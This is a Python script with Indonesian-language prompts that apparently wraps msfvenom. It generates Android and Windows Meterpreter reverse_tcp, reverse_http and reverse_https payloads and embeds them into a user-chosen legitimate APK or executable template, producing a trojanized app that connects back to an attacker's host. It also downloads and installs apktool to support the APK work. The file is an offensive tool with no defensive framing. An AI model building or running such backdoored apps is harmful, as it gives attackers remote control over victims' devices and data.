from os import system,path
from random import choice
from shell  import shell
from beautify import *
from bs4 import BeautifulSoup
from requests import get

bf = Beautify()
ld = Loading()
banner = choice(('eagle1','wolf2','lion1','eagle2'))

def apktool():
    url = 'https://bitbucket.org/iBotPeaches/apktool/downloads/'
    try:
        req = get(url)
        if req.status_code == 200:
            result = [];
            soup = BeautifulSoup(req.content,'html.parser');
            for i,s in zip(
                soup.find_all('a',{'class':'execute'}),
                soup.find_all('td',{'class':'size'})):
                version = i.text.strip('apktool_').strip('jar');
                result.append({'version':version,'size':s.text,'url':f"https://bitbucket.org{i['href']}"});
            return result;
        else:
            return f'Response {req.status_code}';
    except:
        print(bf.txtclr('Masalah koneksi jaringan!','orange',font='fancy115'))
        return ''

def download(url,path):
    req = get(url).content
    with open(path,'wb') as f:
        f.write(req);

def main_page():
    platform = bf.menu(('Android','Windows'),color='darkgreen',font='fancy149')
    pf_dt = input(f'\nplatform > ')
    if not pf_dt:print(bf.txtclr('tidak ada data!','red'))

    # android
    elif pf_dt == '01' and pf_dt in platform.keys():
        py_menu = bf.menu((
            'android/meterpreter/reverse_tcp',
            'android/meterpreter/reverse_http',
            'android/meterpreter/reverse_https'),
            color='darkgreen',font='fancy149')
        py_dt = input(f'\npayload > ')
        if not py_dt:print(bf.txtclr('tidak ada data!','red'))
        elif py_dt in py_menu.keys():
            lhost = input('\nlhost > ')
            if not lhost:print(bf.txtclr('tidak ada data!','red'));
            else:
                lport = input('\nlport > ')
                if not lport:print(bf.txtclr('tidak ada data!','red'));
                else:
                    template = input('\ntemplate apk > ')
                    if not template:print(bf.txtclr('tidak ada data!','red'));
                    else:
                        output = input('\noutput > ')
                        if not output:print(bf.txtclr('tidak ada data!','red'));
                        else:
                            cmd = f"msfvenom -p {py_menu[py_dt]} -t 60 LHOST={lhost} LPORT={lport} -x {template} -o {output}"
                            try:
                                ld.loading(0.2)
                                print(bf.txtclr(f'\nMemproses..','darkgreen',font='fancy115'))
                                ld.show(shell(cmd).output())
                                print(bf.txtclr('\nberhasil!','lightgreen',font='fancy136'))
                                print(bf.txtclr(f'\ntersimpan di {output}\nukuran : {path.getsize(output)} bytes','green',font='fancy136'))
                            except:
                                print(bf.txtclr('ERR!','red'))
        else:print(bf.txtclr('Terjadi kesalahan!','red'))

    # windows
    elif pf_dt == '02' and pf_dt in platform.keys():
        py_menu = bf.menu((
            'windows/meterpreter/reverse_tcp',
            'windows/meterpreter/reverse_http',
            'windows/meterpreter/reverse_https'),
            color='darkgreen',font='fancy149')
        py_dt = input(f'\npayload > ')
        if not py_dt:print(bf.txtclr('tidak ada data!','red'))
        elif py_dt in py_menu.keys():
            lhost = input('\nlhost > ')
            if not lhost:print(bf.txtclr('tidak ada data!','red'));
            else:
                lport = input('\nlport > ')
                if not lport:print(bf.txtclr('tidak ada data!','red'));
                else:
                    template = input('\ntemplate apk > ')
                    if not template:print(bf.txtclr('tidak ada data!','red'));
                    else:
                        output = input('\noutput > ')
                        if not output:print(bf.txtclr('tidak ada data!','red'));
                        else:
                            cmd = f"msfvenom -p {py_menu[py_dt]} -f exe -a x86 -t 60 LHOST={lhost} LPORT={lport} -x {template} -o {output}"
                            try:
                                ld.loading(0.2)
                                print(bf.txtclr(f'\nMemproses..','darkgreen',font='fancy115'))
                                ld.show(shell(cmd).output())
                                print(bf.txtclr('\nberhasil!','lightgreen',font='fancy136'))
                                print(bf.txtclr(f'\ntersimpan di {output}\nukuran : {path.getsize(output)} bytes',color='green',font='fancy136'))
                            except:
                                print(bf.txtclr('ERR!','red'))
        else:print(bf.txtclr('Terjadi kesalahan!','red'))
    else:print(bf.txtclr('tarjadi kesalahan!','red'))


def main():
    print(bf.banner(banner))
    menu = bf.menu(('Payload','Apktool'),font='fancy149',color='magenta')
    slct = input('\npilih > ')
    if slct == '01' and slct in menu.keys():
        main_page();
    if slct == '02' and slct in menu.keys():
        print(bf.txtclr(f'\nRequest..','darkgreen',font='fancy115'))
        for val in apktool():
            if str(val['version']) == str(f"{shell('apktool --version').output()[0]}."):
                print(bf.txtclr(f'versi : {val["version"]} - ukuran : {val["size"]} -> dipakai',font='fancy149',color='green'))
            else:
                print(bf.txtclr(f'versi : {val["version"]} - ukuran : {val["size"]}',font='fancy149',color='darkgreen'))
        print(bf.txtclr('kembali : 99','green',font='fancy149'))
        vrsion = input('\npilih versi > ');
        if not vrsion:pass
        elif vrsion == '99':main()
        else:
            print(bf.txtclr('request..','red'))
            for v in apktool():
                if f'{vrsion}.' in v['version']:
                    ld.loading(0.2)
                    print(bf.txtclr(f'download.. versi {vrsion}','red'))
                    print(ld.show(download(v['url'], 'apktool.jar')))
                    try:
                        print(bf.txtclr('\nmengatur path..','green',font='fancy136'))
                        shell('apt install zipalign -y').output()
                        system(f'sudo chmod +x apktool.jar')
                        system('sudo mv -f apktool.jar /usr/local/bin')
                        if not 'apktool' in shell('ls /usr/local/bin').output():
                            download('https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool','apktool')
                            system('sudo chmod +x apktool')
                            system('sudo mv -f apktool /usr/local/bin')
                        else:
                            url = 'https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool'
                            scr = open('/usr/local/bin/apktool','r').read()
                            if scr == get(url).content:pass
                            else:
                                download('https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool','apktool')
                                system('sudo chmod +x apktool')
                                system('sudo mv -f apktool /usr/local/bin')
                        ld.loading(0.1)
                        ld.show(main())
                    except:
                        print(bf.txtclr('ERR','red',font='fancy136'))
                else:pass
    else:pass
